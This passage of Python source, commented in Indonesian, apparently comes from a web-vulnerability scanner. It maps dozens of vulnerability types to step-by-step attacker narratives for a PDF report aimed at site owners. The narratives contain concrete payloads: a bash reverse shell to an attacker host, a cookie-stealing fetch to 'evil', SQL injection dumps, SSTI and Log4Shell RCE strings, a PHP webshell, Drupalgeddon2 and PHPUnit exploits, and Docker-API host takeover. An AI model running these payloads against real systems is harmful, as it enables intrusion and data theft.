    ),
    "csti_template": (
        "Buka '{url}?q={{{{7*7}}}}'\n"
        "# Body memuat '49' tanpa kurung kurawal = AngularJS sandbox eval (CSTI)."
    ),
    "api_version_downgrade": (
        "curl -s '{url}/api/v2/users/me' -H 'Authorization: Bearer ...'\n"
        "curl -s '{url}/api/v1/users/me'    # versi lama, sering tanpa auth\n"
        "curl -s '{url}/api/old/users'"
    ),
    "grpc_reflection": (
        "grpcurl -plaintext {host}:443 list\n"
        "grpcurl -plaintext {host}:443 describe <Service>"
    ),
    "saml_metadata_exposed": (
        "curl -s '{url}/saml/metadata'\ncurl -s '{url}/Shibboleth.sso/Metadata'\n"
        "curl -s '{url}/simplesaml/saml2/idp/metadata.php'"
    ),
    "webdav_writable": (
        "curl -X PROPFIND '{url}/' -H 'Depth: 1'\n"
        "curl -X PUT '{url}/cyblok.txt' --data 'CYBLOK_WEBDAV'\n"
        "curl '{url}/cyblok.txt'   # bila 200+content sama = full write."
    ),
    "nginx_off_by_slash": (
        "curl '{url}/static../etc/passwd'\n"
        "# Trick: alias /var/www/static; vs alias /var/www/static/;\n"
        "# Tanpa trailing slash di alias = traversal naik 1 folder."
    ),
})


# ============================================================================
# STEPS_MAP — narasi step-by-step "Cara Hacker Masuk"
# ============================================================================
# Dipakai oleh PDF reporter (Bab 4 detail temuan) lewat `extras.STEPS_MAP[m]`
# bila scanner tidak meng-set Finding.exploit_steps secara eksplisit.
# Placeholder {url} dan {host} akan disubstitusi otomatis.
#
# Setiap entry adalah list[str] berisi langkah-langkah berurutan dari sudut
# pandang penyerang: Recon -> Probe -> Exploit -> Post-exploit -> Impact.
# Bahasa: Indonesia, friendly tapi teknis. Tujuannya developer & owner bisa
# membayangkan jalur masuk dan menutup tepat di pintu yang dipakai penyerang.
# ============================================================================
STEPS_MAP: dict[str, list[str]] = {
    # ===== Modul critical/high yang sudah ada (top picks, biar konsisten) =====
    "sqli": [
        "Recon: hacker menyisir endpoint dinamis di {url} (parameter id=, search=, dst.) dari hasil crawler / Burp.",
        "Probe: tambahkan kutip tunggal `'` ke parameter — jika muncul error SQL, parser belum aman.",
        "Map kolom: gunakan `ORDER BY 1-- -`, `2-- -`, ... sampai error untuk tahu jumlah kolom.",
        "Map skema: payload `UNION SELECT 1,table_name,3 FROM information_schema.tables-- -` untuk dump nama tabel.",
        "Dump kredensial: `UNION SELECT 1,username,password FROM users-- -` -> dapat hash password.",
        "Crack hash offline (hashcat/John) dan login sebagai admin -> takeover penuh + akses ke semua data pelanggan.",
    ],
    "cmdi": [
        "Recon: temukan parameter yang dipakai untuk fungsi 'utility' (ping, lookup, convert).",
        "Probe marker: tambahkan `;echo CYBLOK` / `|whoami` ke parameter — kalau output muncul di response, shell ter-eksekusi.",
        "Probe time: `;sleep 5` — bila respons tertunda 5s = command injection terkonfirmasi.",
        "Lateral: buka reverse shell `bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'`.",
        "Privilege: cari sudo NOPASSWD, kunci SSH, file backup -> root.",
        "Persistensi: pasang cronjob backdoor, lalu eksfiltrasi database & secret cloud.",
    ],
    "ssti": [
        "Probe: kirim `{{{{7*7}}}}` (Jinja2/Twig), `${{{{7*7}}}}` (FreeMarker), `<%= 7*7 %>` (ERB) ke field yang di-render server.",
        "Konfirmasi engine: bila body memuat `49` -> template engine mengevaluasi input.",
        "Eskalasi: payload spesifik engine, mis. Jinja2 `{{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}`.",
        "RCE: jalankan `id`, `cat /etc/passwd`, lalu reverse shell.",
        "Eksfiltrasi: ambil `.env` / config gateway pembayaran -> akses akun cloud / payment.",
    ],
    "ssrf": [
        "Recon: cari fitur fetch URL (avatar, webhook, image preview, importer).",
        "Probe: ganti URL ke `http://127.0.0.1/`, `http://localhost:6379/`, `http://169.254.169.254/`.",
        "Konfirmasi: pakai canary domain, lihat HTTP request masuk ke server attacker.",
        "Pivot internal: enumerate service internal (Redis, Elasticsearch, Kibana, admin API) yang biasanya tanpa auth karena 'di belakang firewall'.",
        "Cloud takeover: hit `169.254.169.254/latest/meta-data/iam/security-credentials/<role>` -> dapat AWS access key.",
        "Pakai key cloud untuk download S3, RDS dump -> data breach total.",
    ],
    "ssrf_metadata": [
        "Hacker exploit SSRF di endpoint fetch URL.",
        "Arah ke 169.254.169.254 (AWS) / metadata.google.internal (GCP) / 169.254.169.254/metadata/instance (Azure).",
        "Dapat IAM role token / service account JSON.",
        "Pakai aws-cli dengan token: `aws sts get-caller-identity` -> konfirmasi access.",
        "Enumerate S3 buckets, RDS, Lambda; dump database & function code.",
        "Persistensi: buat IAM user baru dengan AdministratorAccess.",
    ],
    "xss": [
        "Recon: input parameter yang reflect ke HTML (search, error message, profile).",
        "Probe: payload `<svg onload=alert(1)>` atau `\"><script>alert(1)</script>` di parameter.",
        "Konfirmasi: alert/popup muncul di browser pengunjung.",
        "Weaponize: bukan alert, tapi `fetch('https://evil/?c='+document.cookie)` untuk steal cookie.",
        "Distribusi: kirim link berisi payload via DM / iklan ke korban yang sedang login.",
        "Takeover: pakai cookie session korban -> akses akun, ubah password, transfer dana.",
    ],
    "stored_xss": [
        "Hacker buat akun normal, isi field profile/komentar/bio dengan payload XSS.",
        "Payload disimpan ke database tanpa sanitasi.",
        "Setiap user (termasuk admin) yang membuka halaman profile attacker akan eksekusi payload.",
        "Payload steal cookie / token -> kirim ke server attacker.",
        "Hijack session admin -> takeover total platform.",
    ],
    "xxe": [
        "Endpoint menerima XML (SOAP, SVG upload, OOXML import, RSS).",
        "Submit body XML berisi `<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><x>&e;</x>`.",
        "Response memuat isi /etc/passwd -> XXE terkonfirmasi.",
        "Pivot: gunakan `http://169.254.169.254/...` jadi XXE blind -> SSRF metadata cloud.",
        "Eksfiltrasi: out-of-band lewat DTD remote yang dikontrol attacker.",
    ],
    "lfi": [
        "Probe: ganti parameter file= dengan `../../../../etc/passwd` / `....//....//etc/passwd`.",
        "Bypass filter: encoding `..%2f`, null byte `%00`, atau wrapper `php://filter/read=convert.base64-encode/resource=index.php`.",
        "Baca source code aplikasi -> temukan secret, db config.",
        "Eskalasi: log poisoning (`<?php system($_GET['c']); ?>` di User-Agent + LFI ke /var/log/apache2/access.log) = RCE.",
        "Pasang webshell, take over server.",
    ],
    "redirect": [
        "Hacker buat URL: {url}?next=https://evil-bank.com (sub-domain phishing yang mirip).",
        "Sebar link via email/SMS/iklan — terlihat resmi karena domain awal benar.",
        "Korban klik, server redirect ke evil-bank.com (clone halaman login).",
        "Korban login di clone, kredensial masuk ke attacker.",
        "Hacker pakai kredensial untuk takeover akun + transfer dana.",
    ],
    "host_header": [
        "Hacker trigger fitur 'lupa password' untuk email korban.",
        "Saat request, ganti header Host menjadi attacker.com (atau X-Forwarded-Host).",
        "Server menyusun link reset memakai Host header tersebut: https://attacker.com/reset?token=XYZ.",
        "Korban menerima email, klik link — token dikirim ke attacker.com.",
        "Attacker pakai token untuk reset password korban -> takeover akun.",
    ],
    "jwt": [
        "Hacker login normal, ambil JWT dari cookie/Authorization.",
        "Decode token (jwt.io). Cek alg.",
        "alg=none -> ubah payload (`role:admin`), hapus signature.",
        "alg=HS256 dengan secret lemah -> brute hashcat (mode 16500).",
        "alg=RS256 -> coba algorithm confusion: ubah ke HS256, sign pakai public key sebagai secret.",
        "Kirim token forge -> server menerima -> akses sebagai admin.",
    ],
    "jwt_confusion": [
        "Hacker mendapat public key (sering ada di /.well-known/jwks.json).",
        "Ubah header JWT alg dari RS256 menjadi HS256.",
        "Sign ulang token memakai public key sebagai secret HMAC.",
        "Server validasi pakai public key + alg HS256 -> ter-validasi.",
        "Forge JWT bertipe admin/sudo -> akses penuh tanpa tahu private key.",
    ],
    "auth_bypass": [
        "Recon: cari panel admin (/admin, /panel, /dashboard) lewat dirbuster / wordlist.",
        "Coba credential default umum (admin/admin, admin/password, root/root).",
        "Atau bypass via header: `X-Original-URL: /admin`, `X-Forwarded-For: 127.0.0.1`.",
        "Atau path trick: `/admin/..;/`, `//admin/`, `/admin%20`.",
        "Sukses login -> akses fungsi admin: kelola user, ubah konten, eksfiltrasi data.",
    ],
    "deserialization": [
        "Identifikasi cookie/parameter berbau base64 panjang (Java/PHP/.NET serialize).",
        "Dump payload, decode, lihat magic bytes (`rO0AB...` Java, `aced...` Java, `O:8:`, dll).",
        "Build payload eksploit (ysoserial untuk Java) -> command yang dieksekusi saat deserialize.",
        "Kirim payload kembali ke server -> RCE.",
        "Pasang webshell, dump db, lateral.",
    ],
    "file_upload": [
        "Hacker buka form upload (avatar, dokumen, lampiran).",
        "Coba upload `shell.php.jpg`, `shell.phtml`, `shell.PhP`, atau pakai polyglot GIF89a + PHP.",
        "Akses URL hasil upload `{url}/uploads/shell.php.jpg`.",
        "Server eksekusi sebagai PHP -> jalankan command via `?c=id`.",
        "Webshell aktif -> total takeover server (bisa baca semua data, pivot internal).",
    ],
    "idor_generic": [
        "Hacker login dengan akun A, lihat URL endpoint yang memakai ID, mis. /api/orders/12345.",
        "Ubah ID jadi 12344 / 12346 — server tetap kembalikan data.",
        "Iterasi semua ID -> dump seluruh order/invoice/profile pengguna lain.",
        "Eksfiltrasi PII (NIK/HP/CC) -> jual di forum / phishing massal.",
    ],
    "race_condition": [
        "Identifikasi endpoint sensitif: redeem voucher, withdraw saldo, klaim cashback.",
        "Pakai Burp Turbo Intruder atau curl --parallel kirim 30+ request bersamaan.",
        "Server tanpa lock memproses semua sebelum saldo terupdate.",
        "Voucher 1x dipakai 30x / saldo Rp100rb ditarik 30x = Rp3jt.",
        "Hacker cuci ke akun bank lain dalam menit.",
    ],
    "voucher": [
        "Crawl JS public, cari endpoint redeem (/api/voucher/apply).",
        "Coba kode test umum: TEST, FREE, ADMIN, WELCOME, STAFF.",
        "Atau apply voucher valid 2x dengan body identik via race condition.",
        "Saldo bertambah / harga jadi 0 / dapat cashback berkali.",
        "Auto-script ribuan akun, kerugian merchant masif.",
    ],
    "payment": [
        "Hacker buka checkout, intercept request POST /api/checkout.",
        "Ubah field `amount` menjadi `1` atau `-100`, atau status menjadi 'paid'.",
        "Server tidak verifikasi via gateway -> proses pesanan.",
        "Scale: otomatisasi banyak akun -> kerugian besar.",
        "Tambahan: gateway secret bocor -> bisa forge callback `payment.success`.",
    ],
    "balance": [
        "Hacker punya saldo Rp10rb, coba withdraw -50 (negatif).",
        "Server tambah |-50|=50 ke saldo (akumulasi salah) -> saldo jadi Rp50rb.",
        "Atau topup nilai sangat kecil 0.0001 -> akumulasi pembulatan.",
        "Loop ribuan kali -> saldo membengkak.",
        "Withdraw ke rekening bank -> uang merchant hilang.",
    ],
    "otp_check": [
        "Trigger OTP, dapat kode 4 digit dengan TTL 5 menit.",
        "Endpoint verifikasi tidak punya rate-limit.",
        "Brute 0000-9999 (10rb percobaan) dalam <30 detik.",
        "OTP cocok -> verifikasi pass -> takeover akun.",
    ],
    "password_reset": [
        "Hacker pakai email korban di endpoint reset password.",
        "Token reset di-encode lemah / muncul di Referer / dilink HTTP polos.",
        "Pakai Host-header injection / log Referer untuk capture token.",
        "Ganti password korban -> login.",
    ],
    "csrf": [
        "Hacker buat halaman jahat dengan form auto-submit ke {url}/api/transfer.",
        "Sebar link/iframe ke korban yang sedang login.",
        "Browser ikut sertakan cookie session korban (kalau SameSite=None / lax + GET).",
        "Server proses transfer atas nama korban tanpa konfirmasi.",
    ],
    "open_redirect": [
        "Lihat parameter `redirect=`, `next=`, `url=`.",
        "Pasang URL eksternal: `?next=https://evil.com`.",
        "Sebar link domain target -> phishing.",
    ],
    "redirect": [
        "Hacker temukan parameter redirect/next/url di endpoint login/logout/share.",
        "Buat link: {url}?next=https://evil-clone.example.com.",
        "Sebar lewat email yang terlihat resmi (domain awal benar).",
        "Korban klik, server pantulkan ke clone phishing.",
        "Korban login di clone — kredensial pindah ke attacker -> takeover akun.",
    ],
    "subdomain_takeover": [
        "Recon: enumerasi subdomain (subfinder, crt.sh).",
        "Cek CNAME -> github.io / s3 / heroku / azure tapi resource sudah dihapus.",
        "Hacker daftarkan resource itu (bucket, app) -> jadi pemilik konten.",
        "Sub-domain target sekarang mengarah ke konten attacker -> phishing & XSS lintas-domain.",
    ],
    "rate_limit": [
        "Hacker siapkan 1 juta password populer.",
        "Endpoint login tidak ada lockout/CAPTCHA setelah N percobaan salah.",
        "Otomatisasi credential stuffing -> ribuan akun valid.",
        "Akun valid dijual atau diambil-alih.",
    ],
    "rate_limit_bypass": [
        "Endpoint login punya lockout per-IP atau per-user.",
        "Hacker rotasi IP via X-Forwarded-For palsu, X-Real-IP, header Akamai.",
        "Atau ubah username/email casing (Admin vs admin) untuk bypass per-user counter.",
        "Brute-force lanjut tanpa terblok.",
    ],
    "captcha_bypass": [
        "Form login pakai captcha tapi token captcha tidak divalidasi server.",
        "Hacker hapus parameter captcha-response / kirim string apa saja.",
        "Server tetap proses login -> brute-force jalan.",
    ],
    "env_leak": [
        "Hacker scan path umum: /.env, /backup/.env, /config/.env, /.git/config.",
        "Atau hit endpoint debug: /actuator/env, /__debug__/.",
        "Dapat AWS_ACCESS_KEY, STRIPE_SECRET, SMTP password, dll.",
        "Pakai key untuk akses cloud / charge card / kirim phishing dari domain korban.",
    ],
    "source_leak": [
        "Hacker akses /.git/HEAD -> dapat repo aktif.",
        "Pakai `git-dumper` clone full repo dari folder /.git/.",
        "Baca commit history -> banyak secret yang dihapus tapi masih di history.",
        "Pakai untuk RCE / takeover akun cloud.",
    ],
    "sensitive_files": [
        "Probe path: backup.zip, db.sql, .env, .DS_Store, .git/, web.config.",
        "Salah satunya 200 -> download.",
        "File berisi credential, source, db dump -> total compromise.",
    ],
    "cors": [
        "Hacker buat halaman attacker.com.",
        "Kirim XHR cross-origin ke {url}/api/me dengan credentials:include.",
        "Server reflect Origin: attacker.com + Allow-Credentials: true.",
        "Browser korban kirim cookie -> attacker baca data API privat korban.",
    ],
    "cache_poison": [
        "Identifikasi parameter / header reflektif (X-Forwarded-Host, dst.) yang ikut di-cache CDN.",
        "Kirim request dengan header palsu -> response berisi konten rusak ter-cache.",
        "Pengunjung berikut dapat konten attacker (defacement / XSS persisten).",
    ],
    "http_smuggling": [
        "Kirim request dengan kombinasi Content-Length + Transfer-Encoding berbeda.",
        "Front (CDN) parse satu cara, backend cara lain -> queue tercemar.",
        "Request korban berikutnya digabung dengan payload attacker -> session hijack / akses admin.",
    ],
    "graphql_dos": [
        "Introspeksi schema GraphQL aktif.",
        "Susun query nested berlebihan (10+ level) atau alias berlipat.",
        "Server mengeksekusi DB join eksponensial -> CPU 100%, layanan down.",
    ],
    "graphql_deep": [
        "Hit /graphql dengan introspection query.",
        "Dapat full schema: Query, Mutation, types, fields.",
        "Map mutation berbahaya: createAdmin, setRole, deleteUser tanpa otorisasi.",
        "Eksekusi mutation -> takeover.",
    ],
    "ldap_injection": [
        "Form login pakai LDAP backend.",
        "Pasang username `*)(uid=*` + password apa saja -> filter LDAP rusak.",
        "Server bind anonymous / true -> login tanpa password.",
    ],
    "xpath_injection": [
        "Form login pakai XML/XPath backend.",
        "Pasang `' or '1'='1` di username -> XPath jadi true.",
        "Auth bypass / dump XML data.",
    ],
    "nosqli": [
        "Endpoint login terima JSON.",
        "Kirim `{{\"username\":\"admin\",\"password\":{{\"$ne\":null}}}}`.",
        "MongoDB cocokkan password apa saja yang bukan null -> bypass auth.",
    ],
    "logout_csrf": [
        "Hacker pasang `<img src='{url}/logout'>` di halaman jahat.",
        "Korban yang login auto-logout setiap kunjungi halaman jahat -> annoyance / fase pre-phishing.",
    ],
    "social_csrf": [
        "Hacker buat halaman dengan form auto-submit ke {url}/api/follow?u=evil.",
        "Korban yang login auto-follow akun attacker.",
        "Massal -> follower palsu, manipulasi viral, scam koin / influence ops.",
    ],
    "oauth_check": [
        "Periksa /authorize, redirect_uri tidak dicek strict.",
        "Pasang redirect_uri=https://attacker.example.com.",
        "Korban login -> code dikirim ke attacker -> exchange jadi token -> takeover.",
    ],
    "oauth_takeover": [
        "Aplikasi pakai email sebagai identitas akun.",
        "Hacker register OAuth dengan provider X email yang sama dengan korban di provider Y.",
        "Backend gabungkan kedua akun -> attacker masuk sebagai korban.",
    ],
    "private_profile_bypass": [
        "Endpoint UI hide profile private, tapi API mobile tetap mengembalikan data.",
        "Hacker hit endpoint API langsung -> dapat foto/posting privat.",
    ],
    "media_persistence": [
        "User hapus foto privat dari aplikasi.",
        "Hacker yang sebelumnya menyimpan URL CDN tetap akses URL itu -> file masih ada.",
        "Rilis ulang -> kebocoran konten privat.",
    ],
    "dm_privacy": [
        "Endpoint /api/messages/<id> tidak cek owner.",
        "Hacker iterasi id -> baca semua DM antar user.",
    ],
    "csv_injection": [
        "Endpoint export CSV memuat input user (nama, alamat) tanpa escaping.",
        "Hacker isi nama dengan `=cmd|'/c calc'!A1` atau `=HYPERLINK(...,...)`.",
        "Staff buka CSV di Excel -> formula tereksekusi -> RCE/eksfiltrasi.",
    ],
    "log_injection": [
        "Hacker submit input dengan newline + entry palsu.",
        "Log SIEM tercemar entry palsu -> alert salah / koreksi forensik gagal.",
    ],
    "crlf_injection": [
        "Parameter dipantulkan ke header response.",
        "Pasang `%0d%0aSet-Cookie:session=evil`.",
        "Server set cookie session attacker pada browser korban -> session fixation -> takeover.",
    ],
    "response_splitting": [
        "Sama dengan CRLF injection: header response terbelah.",
        "Bisa inject Set-Cookie / Location / Content-Type -> redirect/cache poisoning.",
    ],
    "ws_check": [
        "Hacker buat halaman attacker.com.",
        "Buka koneksi WebSocket ke wss://{host}/ws dari halaman attacker.",
        "Server tidak cek Origin -> koneksi diizinkan dengan cookie korban.",
        "Attacker baca/kirim pesan internal atas nama korban.",
    ],
    "webhook_signature": [
        "Hacker temukan endpoint webhook (mis. /webhook/payment).",
        "Forge JSON `payment.success` tanpa header signature, atau dengan signature yang tidak divalidasi.",
        "Server menandai order sebagai paid -> barang dikirim gratis.",
    ],
    "mass_assignment": [
        "Form register kirim JSON {{name, email, password}}.",
        "Hacker tambah field `role:admin` / `is_staff:true`.",
        "Backend pakai ORM bind langsung -> field admin tersimpan -> akun baru = admin.",
    ],
    "proto_pollution": [
        "Endpoint terima JSON dengan body merge ke object internal.",
        "Pasang `{{\"__proto__\":{{\"isAdmin\":true}}}}`.",
        "Object literal di server kontaminasi -> seluruh request berikutnya isAdmin=true.",
        "Eskalasi privilege total.",
    ],
    "zip_slip": [
        "Aplikasi terima upload .zip / .tar dan auto-extract.",
        "Hacker upload zip yang berisi file path `../../../../etc/cron.d/evil`.",
        "Saat extract, file ditulis ke /etc/cron.d -> cron eksekusi tiap menit -> RCE.",
    ],
    "xslt_injection": [
        "Endpoint terima XML/XSL.",
        "Hacker submit XSL berisi `system-property` / `document()` -> baca file lokal / SSRF.",
    ],
    "timing_attack": [
        "Endpoint login balas berbeda waktu untuk user-exists vs not-exists.",
        "Hacker enumerate user dengan waktu respons -> dapat list username valid.",
        "Lanjut credential stuffing fokus.",
    ],
    "url_preview_ssrf": [
        "Hacker kirim DM/share dengan URL `http://127.0.0.1:6379/`.",
        "Server fetch untuk preview -> dapat banner Redis -> SSRF.",
        "Lanjut: hit metadata cloud -> takeover akun cloud.",
    ],
    "unicode_bypass": [
        "Hacker buat domain pengganti pakai Cyrillic / look-alike: пaypal.com vs paypal.com.",
        "Sebar link via SMS -> korban tidak sadar URL beda.",
        "Korban login -> kredensial ke attacker.",
    ],

    # ===== 30 modul baru (CRITICAL / HIGH) =====
    "apache_path_confusion": [
        "Recon: hacker fingerprint web server dan dapat versi Apache 2.4.49 / 2.4.50.",
        "Probe: kirim `{url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` (path traversal terkode-ganda).",
        "Validasi: response 200 berisi `root:x:0:0:` -> CVE-2021-41773/42013 terkonfirmasi.",
        "Eksploitasi: bila mod_cgi aktif, ubah ke `/cgi-bin/.%2e/.../bin/sh` + body shell -> RCE.",
        "Post-exploit: dump /etc/shadow, ambil SSH key, install backdoor systemd.",
        "Impact: server dikuasai penuh — bisa pivot ke jaringan internal & exfil database.",
    ],
    "phpunit_rce": [
        "Recon: hacker scan path `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`.",
        "Probe: kirim POST dengan body `<?php echo md5(1); ?>`.",
        "Validasi: response memuat `c4ca4238a0b923820dcc509a6f75849b` -> CVE-2017-9841 confirmed.",
        "Eksploitasi: body `<?php system($_GET['c']); ?>` lalu `?c=id` -> jalankan command.",
        "Persistensi: tulis webshell ke document root -> akses kapan saja.",
        "Impact: takeover total aplikasi PHP & data pelanggan.",
    ],
    "log4shell_probe": [
        "Recon: identifikasi aplikasi Java (Spring/Struts/VMware) dari header & error.",
        "Probe: inject `${{jndi:ldap://canary.attacker/a}}` ke User-Agent / X-Forwarded-For / form input.",
        "Validasi: server attacker menerima DNS/LDAP callback -> Log4Shell aktif (CVE-2021-44228).",
        "Eksploitasi: serve LDAP referral ke class jahat (mis. ysoserial) -> JVM load -> RCE.",
        "Post-exploit: dump memori untuk session token, exfil .env dan keystore.",
        "Impact: full RCE dengan privilege JVM (sering root) -> seluruh stack jatuh.",
    ],
    "spring_actuator_rce": [
        "Probe: GET `/actuator`, `/actuator/env`, `/actuator/heapdump`, `/actuator/jolokia`.",
        "Validasi: 200 + JSON list endpoint = actuator ter-expose tanpa proteksi.",
        "Heapdump: download `.hprof`, parse dengan VisualVM -> dapat secret env, JWT signing key, db password.",
        "Env mutate: POST ke `/actuator/env` ubah `spring.datasource.url` ke server attacker -> exfil credential.",
        "Jolokia: chain ke MBean Logback / JMX -> RCE.",
        "Impact: dari config endpoint langsung naik ke RCE + akses penuh database.",
    ],
    "gitlab_unauth_api": [
        "Probe: GET `{url}/api/v4/users?per_page=100`.",
        "Validasi: 200 + JSON daftar user lengkap -> public API exposure.",
        "Enumerate: kumpulkan email/username untuk kampanye phishing terarah.",
        "Eskalasi: GET `/api/v4/projects?visibility=internal` -> dapat repo internal yang tidak public.",
        "Post-exploit: clone source code internal, cari hardcoded secret di history.",
        "Impact: kebocoran source code rahasia perusahaan + email staff -> chain ke takeover.",
    ],
    "jenkins_unauth_console": [
        "Probe: GET `{url}/script` atau `/manage` tanpa autentikasi.",
        "Validasi: HTML memuat 'Groovy script' / 'Manage Jenkins' -> Script Console terbuka.",
        "Eksploitasi: POST ke `/scriptText` dengan Groovy `\"id\".execute().text` -> server eksekusi.",
        "Post-exploit: install backdoor di build agent, curi credential CI/CD (AWS, registry).",
        "Lateral: pipeline punya akses ke production -> deploy artefak jahat.",
        "Impact: supply-chain compromise — semua pelanggan menerima rilis teracun.",
    ],
    "wp_xmlrpc_amplify": [
        "Probe: POST `{url}/xmlrpc.php` dengan `<methodCall><methodName>system.listMethods</methodName></methodCall>`.",
        "Validasi: response XML memuat `pingback.ping` / `wp.getUsersBlogs` -> xmlrpc aktif.",
        "Brute-force: pakai `wp.getUsersBlogs` untuk uji 1.000 password per request (amplifikasi 1000x vs /wp-login).",
        "DDoS amplification: kirim `pingback.ping` dengan target URL korban -> WordPress lain ikut hit korban.",
        "Post-exploit: takeover akun admin -> install plugin backdoor.",
        "Impact: takeover situs WP + dipakai untuk DDoS pihak ketiga.",
    ],
    "drupalgeddon2": [
        "Recon: identifikasi situs Drupal 7/8 dari banner & path.",
        "Probe: POST `{url}/?q=user/password&name[#post_render][]=printf&name[#markup]=CYBLOK&name[#type]=markup`.",
        "Validasi: response berisi 'CYBLOK' setelah render -> CVE-2018-7600 confirmed.",
        "Eksploitasi: ganti `printf` menjadi `passthru` + `id` -> RCE.",
        "Post-exploit: tulis webshell di `sites/default/files/`, install miner.",
        "Impact: full takeover server Drupal + database situs.",
    ],
    "bypass_403": [
        "Recon: temukan path 403 (admin, dashboard, internal) lewat dirbuster.",
        "Probe header: `X-Original-URL: /admin`, `X-Rewrite-URL: /admin`, `X-Forwarded-For: 127.0.0.1`.",
        "Probe path: `/admin/.`, `/admin/..;/`, `/admin%20`, `/admin%09`, `//admin/`.",
        "Validasi: salah satu balas 200 atau konten admin -> bypass terkonfirmasi.",
        "Eksploitasi: akses fungsi admin (kelola user, ubah harga, view PII).",
        "Impact: pelanggaran kontrol akses tingkat tinggi -> data breach + manipulasi konten.",
    ],
    "docker_remote_api": [
        "Scan port 2375/2376/2377 atau path `/version` di host yang dicurigai docker proxy.",
        "Validasi: GET `/version` 200 + JSON `ApiVersion` -> Docker Remote API tanpa TLS/auth.",
        "Enumerate: GET `/containers/json` -> semua container & image.",
        "Eksploitasi: `POST /containers/create` dengan bind-mount `/:/host` -> chroot ke host.",
        "Post-exploit: tulis SSH key ke `/host/root/.ssh/authorized_keys` -> SSH root.",
        "Impact: physical-host takeover melalui Docker -> seluruh container + data jatuh.",
    ],
    "elasticsearch_unauth": [
        "Probe: GET `{url}/_cluster/health` (default 9200).",
        "Validasi: 200 + JSON cluster -> Elasticsearch unauth.",
        "Enumerate: `/_cat/indices?v` -> semua nama index, sering berisi log + PII.",
        "Dump data: `/<index>/_search?size=10000` -> ekstraksi seluruh dokumen.",
        "Persistence: tulis index baru, schedule ETL ke server attacker.",
        "Impact: kebocoran log produksi, PII pelanggan, audit trail -> sanksi UU PDP.",
    ],
    "prometheus_unauth": [
        "Probe: GET `{url}/metrics` atau `/api/v1/targets` (default 9090).",
        "Validasi: 200 + format `# HELP` / `# TYPE` -> Prometheus terbuka.",
        "Recon dalam: dapat hostname internal, versi service, service mesh map.",
        "Pivot: target endpoint `/api/v1/targets` ungkap semua endpoint internal -> SSRF target.",
        "Impact: bocor blueprint arsitektur -> serangan lanjutan presisi.",
    ],
    "grafana_default_login": [
        "Probe: POST `{url}/login` dengan `admin/admin`.",
        "Validasi: cookie `grafana_session` muncul + redirect ke `/?orgId=1` -> default password masih aktif.",
        "Post-login: GET `/api/datasources` -> connection string ke Postgres/MySQL/Prometheus production.",
        "Eksploitasi: cek CVE Grafana (mis. CVE-2021-43798 path traversal di datasource plugin).",
        "Impact: akses metric & datasource credential production -> dapat credential DB inti.",
    ],
    "kibana_unauth": [
        "Probe: GET `{url}/app/home` / `/api/status`.",
        "Validasi: HTML berisi `kbn-version` / `KIBANA_INDEX` -> Kibana terbuka.",
        "Enumerate: pakai Discover UI untuk query semua index -> log produksi + PII.",
        "Pivot: console Dev Tools mengirim query ke Elasticsearch backend (sama-sama tanpa auth).",
        "Impact: log eksekutif, PII, dan audit trail bocor.",
    ],
    "solr_admin_unauth": [
        "Probe: GET `{url}/solr/admin/cores?action=STATUS&wt=json`.",
        "Validasi: 200 + responseHeader -> Solr admin terbuka.",
        "Eksploitasi RCE klasik: aktifkan VelocityResponseWriter via `config` API, lalu `select?q=...&wt=velocity` -> arbitrary Velocity = RCE.",
        "Post-exploit: pasang webshell, dump koleksi data.",
        "Impact: RCE pada server Solr + bocor index pencarian (sering berisi data pelanggan).",
    ],
    "adminer_exposed": [
        "Probe: GET `{url}/adminer.php`, `/db/adminer.php`, `/admin/adminer.php`.",
        "Validasi: HTML memuat 'Adminer' + form server/login -> tool DB terbuka publik.",
        "Eksploitasi: brute-force ke DB lokal, atau pakai 'Adminer SSRF' untuk connect ke DB internal mana saja.",
        "Pivot: connect ke Postgres/MySQL internal -> dump database.",
        "Impact: akses langsung ke seluruh database produksi.",
    ],
    "phpmyadmin_exposed": [
        "Probe: GET `{url}/phpmyadmin/`, `/pma/`, `/myadmin/`.",
        "Validasi: HTML phpMyAdmin -> panel terbuka.",
        "Eksploitasi: brute-force credential / pakai CVE phpMyAdmin (mis. CVE-2018-12613 LFI).",
        "Post-exploit: SQL `SELECT INTO OUTFILE` -> tulis webshell ke webroot -> RCE.",
        "Impact: full takeover DB + server.",
    ],
    "iis_shortname": [
        "Probe: GET `{url}/*~1*/.aspx` ke IIS.",
        "Validasi: IIS balas 404 untuk path valid (file ada) vs 400 (tidak ada) -> short-name disclosure aktif.",
        "Enumerate: pakai shortscan/IIS-ShortName-Scanner untuk dapat semua short-name 8.3.",
        "Eksploitasi: tebak full name (mis. backup~1.zip -> backup_2024_db.zip).",
        "Impact: kebocoran nama file backup/internal -> chain ke download data sensitif.",
    ],
    "cache_deception": [
        "Recon: identifikasi CDN yang cache berdasarkan extension (.css, .js, .png).",
        "Probe: minta `/profile/cyblok.css` saat login (server biasanya abaikan path tambahan).",
        "Validasi: response berisi data privat user (nama/email) tapi header `cf-cache-status: HIT` -> cache deception.",
        "Eksploitasi: korban dipancing membuka URL `/profile/cyblok.css` -> CDN cache versi private korban.",
        "Hacker akses URL yang sama -> dapat data privat korban dari cache.",
        "Impact: akses data PII pelanggan tanpa harus login.",
    ],
    "cors_null_origin": [
        "Probe: kirim `curl -H 'Origin: null' {url}/api/me`.",
        "Validasi: response header `Access-Control-Allow-Origin: null` + `Allow-Credentials: true` -> rentan.",
        "Eksploitasi: hacker host halaman dengan `<iframe sandbox src=...>` -> Origin: null + cookie korban dikirim.",
        "Eksfiltrasi data API yang seharusnya privat ke server attacker.",
        "Impact: kebocoran data API privat lewat browser korban.",
    ],
    "smtp_header_injection": [
        "Recon: form kontak/share kirim email atas nama user.",
        "Probe: pasang `victim@x.com%0d%0aBcc:%20attacker@evil.com` di field email.",
        "Validasi: email yang biasa hanya ke 1 tujuan kini tembus ke attacker juga -> CRLF injection di SMTP.",
        "Eksploitasi: spoof From header dari domain target -> kampanye phishing massal.",
        "Impact: phishing dari domain resmi perusahaan -> SPF lulus, korban tertipu.",
    ],
    "oauth_redirect_bypass": [
        "Probe: `{url}/oauth/authorize?response_type=code&client_id=...&redirect_uri=https://attacker.example.com`.",
        "Probe variasi: `redirect_uri=https://{host}.attacker.com`, `//attacker.com`, `https://target%40attacker.com`.",
